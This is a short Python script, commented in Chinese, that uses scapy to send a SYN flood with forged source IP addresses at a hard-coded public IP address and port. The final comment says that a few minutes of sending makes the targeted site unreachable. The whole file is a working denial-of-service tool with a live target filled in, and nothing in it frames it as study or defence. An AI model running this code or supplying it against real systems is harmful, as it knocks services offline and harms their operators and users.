import threading
import random
import socket
import time
from scapy.all import *
 

class myThread(threading.Thread):
    def __init__(self, threadID):
        threading.Thread.__init__(self)
        self.threadID = threadID

    def run(self):
        # print("开始线程：" + str(self.threadID))
        synFlood(self.threadID)
        # print("退出线程：" + str(self.threadID))

#  定义syn洪流函数，tgt为目标ip，dPort为目标端口
def synFlood(threadID):
    dPort = 8888
    tgt = "121.199.60.137"
    #  先任意伪造4个ip地址
    srcList = ['11.1.1.2','22.1.1.102','33.1.1.2',
               '125.130.5.199']
    #  选择任意一个端口号
    for sPort in range(1024, 2027):
        index = random.randrange(4)
        #  类似上面那个代码构造IP/TCP包，然后send
        ipLayer = IP(src=srcList[index], dst=tgt)
        tcpLayer = TCP(sport=sPort, dport=dPort,flags='S')
        packet = ipLayer/tcpLayer
        send(packet)
  
thread = []
thread_num = 1
log = []
# starttime = datetime.datetime.now()
for i in range(thread_num):
    thread.append(myThread(i))
    
for i in range(thread_num):
    thread[i].start()

for i in range(thread_num):
    thread[i].join()
#  发送完后就可以去看看这个服务器的响应速度了。一般是持续发送几分钟，这个网站就访问不了了
